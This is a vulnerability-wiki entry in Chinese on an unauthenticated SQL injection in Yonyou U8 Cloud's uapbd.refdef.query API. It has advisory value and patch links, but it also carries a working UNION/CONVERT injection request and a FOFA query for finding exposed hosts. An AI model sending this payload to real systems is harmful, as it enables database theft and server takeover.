---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "用友U8 Cloud uapbd.refdef.query refName SQL 注入"
product: "用友U8 Cloud"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "列1.0至5.1；SQL Server报错转换"
prerequisites: "appcode=huo/isEncrypt=N前提未解释"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%94%A8%E5%8F%8BU8/%E7%94%A8%E5%8F%8BU8%20Cloud%20uapbd.refdef.query%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "title==\"U8C\""
id: "vw-e12691ab09feef6804a0824c"
entity_id: "ve-e12691ab09feef6804a0824c"
schema_version: "1"
previous_fofa_unverified: "title=="
---

# 用友U8 Cloud uapbd.refdef.query refName SQL 注入

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：用友U8 Cloud；uapbd.refdef.query refName SQLi
- 版本、配置及部署条件：列1.0至5.1；SQL Server报错转换
- 认证与权限前提：appcode=huo/isEncrypt=N前提未解释
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- refName三列UNION和CONVERT报错需固定结构/响应判据
- 未授权需解释appcode是否公开或可任选
- 保留notice590和具体patchInfo，FOFA残缺、HTTP围栏欠缺

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

用友U8 Cloud uapbd.refdef.query 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## 影响版本

version = 1.0,2.0,2.1,2.3,2.5,2.6,2.65,2.7,3.0,3.1,3.2,3.5,3.6,3.6sp,5.0,5.0sp,5.1

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：title=="U8C"

POC/EXP：

```http
POST /u8cloud/openapi/uapbd.refdef.query?appcode=huo&isEncrypt=N HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/json
Accept-Encoding: gzip
Connection: close

{"refName":"1%' UNION ALL SELECT 1,CONVERT(INT,@@VERSION),1-- "}
```


![image-20241101213312680](./.resource/用友U8Clouduapbd.refdef.querySQL注入漏洞/media/image-20241101213312680.png)


## 修复方案

关闭互联网暴露面或接口设置访问权限

升级补丁<U8CLOUD系统API接口uapbd.refdef.query存在SQL注入漏洞的安全补丁>

漏洞公告：

https://security.yonyou.com/#/noticeInfo?id=590

补丁链接：https://security.yonyou.com/#/patchInfo?identifier=563f888c335e4824a7a3c08353e597dd


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
